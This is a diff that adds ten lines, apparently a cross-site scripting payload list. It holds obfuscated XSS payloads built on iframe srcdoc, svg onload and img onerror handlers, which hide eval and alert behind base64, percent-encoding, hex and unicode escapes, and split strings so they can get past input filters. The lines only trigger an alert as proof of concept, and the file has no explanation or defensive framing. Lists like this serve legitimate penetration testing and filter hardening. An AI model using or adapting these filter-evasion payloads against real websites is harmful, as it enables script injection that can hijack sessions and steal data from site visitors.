@@ -1,0 +1,10 @@
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTEp'))>">
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTEp'))>">
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74(49,49,49)'))>">
+<iframe srcdoc="<img src=x onerror=setTimeout(eval(atob('YWxlcnQoMTEp')),0)>">
+<svg onload=window['ev'+'al']('ale'+'rt(49,49,49)')>
+<iframe srcdoc="<script>window['\x65\x76\x61\x6c'](unescape('%61%6c%65%72%74(49,49,49)'))</script>">
+<iframe srcdoc="<img src=x onerror=window['\x65\x76\x61\x6c']('\u0061\u006c\u0065\u0072\u0074(49,49,49)')>">
+<svg onload=eval(atob('YWxlcnQoMTEp'))>
+<iframe srcdoc="<script>eval('ale'+'rt(49,49,49)')</script>">
+<iframe srcdoc="<svg onload=window['\x65\x76\x61\x6c']('\u0061\u006c\u0065\u0072\u0074(49,49,49)')>">
